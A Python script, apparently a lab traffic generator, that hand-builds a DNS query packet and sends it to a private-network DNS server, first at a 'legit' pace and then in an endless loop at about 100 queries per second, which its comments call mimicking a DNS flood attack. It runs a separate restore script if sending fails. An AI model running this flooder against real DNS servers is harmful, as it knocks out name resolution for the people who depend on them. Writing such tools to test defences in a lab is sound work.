import subprocess
import socket
import time
import atexit

# DNS Server (Use 8.8.8.8 for Google's Public DNS, or your custom DNS server)
DNS_SERVER = "192.168.0.18"
DNS_PORT = 53
TARGET_DOMAIN = "example.com"
RESTORE_SCRIPT = "interface_restore.py"


# Function to construct the DNS query packet
def create_dns_query(domain):
    """Constructs a DNS query for the given domain in binary format."""
    query = b"\xaa\xaa"  # Transaction ID (randomized)
    query += b"\x01\x00"  # Standard query
    query += b"\x00\x01"  # Questions: 1
    query += b"\x00\x00"  # Answer RRs: 0
    query += b"\x00\x00"  # Authority RRs: 0
    query += b"\x00\x00"  # Additional RRs: 0

    # Convert domain to DNS query format (e.g., "example.com" -> 7example3com0)
    for part in domain.split("."):
        query += bytes([len(part)]) + part.encode()
    query += b"\x00"  # End of domain
    query += b"\x00\x01"  # Query type A (IPv4 address)
    query += b"\x00\x01"  # Query class IN (Internet)

    return query


# Function to restore network interfaces
def restore_network():
    print("Running restore script...")
    try:
        subprocess.run(["python3", RESTORE_SCRIPT], check=True)
        print("Network restore script executed successfully.")
    except Exception as e:
        print(f"Failed to run restore script: {e}")


# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
dns_query = create_dns_query(TARGET_DOMAIN)

print(f"Starting DNS query loop to {DNS_SERVER}...\n")

try:
    # Send 50 DNS queries over a 10-second period, mimic legit traffic
    for i in range(50):
        print(f"Sending DNS query {i + 1}/50...")
        try:
            sock.sendto(dns_query, (DNS_SERVER, DNS_PORT))
        except Exception as e:
            print(f"Error sending DNS query: {e}")
            restore_network()
            time.sleep(15)  # wait 15 seconds before calling restore interfaces
            break
        time.sleep(10 / 50)  # Wait to distribute 50 queries over 10 seconds

    print("Initial 50 DNS queries sent. Increasing to 100/sec")

    # Send DNS queries to mimic DNS Flood attack
    while True:
        print("Sending DNS queries at 100 per second...")
        time.sleep(0.01)  # 100 queries per second
        try:
            sock.sendto(dns_query, (DNS_SERVER, DNS_PORT))
        except Exception as e:
            print(f"Error sending DNS query: {e}")
            restore_network()
            time.sleep(15)  # wait 15 seconds before calling restore interfaces
            break

except KeyboardInterrupt:
    print("\nCtrl+C pressed. Exiting...")
finally:
    # restore_network()
    sock.close()

# Close the socket (if script is ever stopped)
sock.close()
